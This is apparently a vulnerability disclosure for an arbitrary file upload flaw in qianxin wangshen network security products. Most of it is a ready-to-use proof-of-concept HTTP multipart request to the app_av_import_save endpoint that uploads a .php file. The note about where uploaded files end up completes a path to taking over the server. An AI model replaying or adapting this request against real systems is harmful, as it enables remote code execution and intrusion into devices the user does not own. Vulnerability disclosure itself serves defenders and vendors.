# Product name
qianxin wangshen
## URL
https://www.legendsec.com/
## Version
last

# Vulnerability 
## Problem file
1.php
## poc

```
POST /?g=app_av_import_save HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye47i1yjiwdNmjKaQ
Content-Length: 532

------WebKitFormBoundarye47i1yjiwdNmjKaQ
Content-Disposition: form-data; name="MAX_FILE_SIZE"

10000000
------WebKitFormBoundarye47i1yjiwdNmjKaQ
Content-Disposition: form-data; name="upfile"; filename="12.php"
Content-Type: text/plain

12121
------WebKitFormBoundarye47i1yjiwdNmjKaQ
Content-Disposition: form-data; name="submit_post"

obj_app_upfile
------WebKitFormBoundarye47i1yjiwdNmjKaQ
Content-Disposition: form-data; name="__hash__"

0b9d6b1ab7479ab69d9f71b05e0e9445
------WebKitFormBoundarye47i1yjiwdNmjKaQ--
```
## Vulnerability details
Any file upload vulnerability exists on the interface. You can use this vulnerability to obtain the host permission of the server.
<img src=./1.png>
The path of the uploaded file is:
url+/attachements/xxxxx.php
<img src=./2.png>


